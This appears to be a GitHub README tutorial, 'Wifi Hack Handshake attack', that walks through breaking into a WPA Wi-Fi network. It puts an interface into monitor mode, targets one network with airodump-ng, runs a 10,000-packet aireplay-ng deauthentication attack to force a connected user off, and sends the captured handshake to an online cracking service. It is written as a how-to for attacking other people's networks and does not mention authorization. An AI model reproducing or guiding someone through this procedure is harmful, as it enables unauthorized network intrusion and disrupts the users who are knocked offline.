<h1 align="center">Wifi Hack Handshake attack</h1>

[![N|dc](https://i.hizliresim.com/3vwdudh.png)](https://discord.gg/5sYSzWQJ3Z)

<details> 
 <summary><strong>Contents (İçindekiler)</strong></summary>
 <p>

* Monitor - Managed mod
  - [mon & man](#monman)
* Airodump-ng
  - [Gathering information](#infonet)
* Aireplay-ng
  - [Attack/Handshake](#attack)
* Decrypt Handshake
  - [Dec. Handshake file](#decrypt)

<br>
</details>

# Wifi Hack

## Catch Handshake

### ([▲](#top)) Monitor & Manage <a name="monman"></a>
`Turning on monitor mode`, example usage:
- `airmon-ng start <interface>`
```
┌──(root💀kali)-[~]
└─# airmon-ng start wlan0
```
<a href="https://i.hizliresim.com/jr314du.png">Airmon</a>
<a href="https://i.hizliresim.com/74x8rav.png">iwconfig</a>

`Turning off monitor mode`, example usage:
- `airmon-ng stop <interface>`
```
┌──(root💀kali)-[~]
└─# airmon-ng stop wlan0
```

### ([▲](#top)) Gathering information about networks <a name="infonet"></a>

`start monitoring networks`, airodump-ng <interface> example usage:

```
┌──(root💀kali)-[~]
└─# airodump-ng wlan0mon
```
<a href="https://www.hizliresim.com/jemkzmg.png">Airodump</a>

```
BSSID = MAC Address
Power = PWR - Signal power
Data = the data we have
CH = Channel - What channel is it on
ENC = Encryption model
CIPHER = Decrypton model
ESSID = network name
Example airodump-ng usage:
```
- For the information gathering and deauthentication attack for the network to be attacked, we first need to enter the following line of code, example usage:
`airodump-ng --bssid <bssid> --channel <channel_number> --write <filename> <interface>`

```
┌──(root💀kali)-[~]
└─# airodump-ng --bssid 0A:1B:2C:3D:4E:5F --channel 5 --write handshake_file wlan0mon
```

### ([▲](#top)) Attack target <a name="attack"></a>

- Deauthentication attack, The product connected to wifi needs to be dropped from the network. Example usage:

`aireplay-ng --deauth <#packets> -a <target_MAC> -c <station> <interface>`

```
┌──(root💀kali)-[~]
└─# aireplay-ng --deauth 10000 -a 0A:1B:2C:3D:4E:5F -c 0A:1B:2C:3D:4E:5F wlan0mon
```
<a href="https://www.hizliresim.com/bfjo2y6.png">Aireplay</a>

NOTE: Our goal here is to remove the user connected to our target network from the network and reconnect, and to capture and decrypt the encrypted numbers that occur in the air when the user wants to reconnect to the network.

### ([▲](#top)) Decrypt Handshake <a name="decrypt"></a>

- Previously, we were able to crack handshake files with the aircrack-ng command, but these days could take weeks, with the resource I will give you, you can crack the handshakes you have captured without even having to keep your computer open :)

`https://hashes.com/en/decrypt/hash`





`Soon, the program written in python will come.`

You can support us by joining our community, thanks for reading. > https://discord.gg/5sYSzWQJ3Z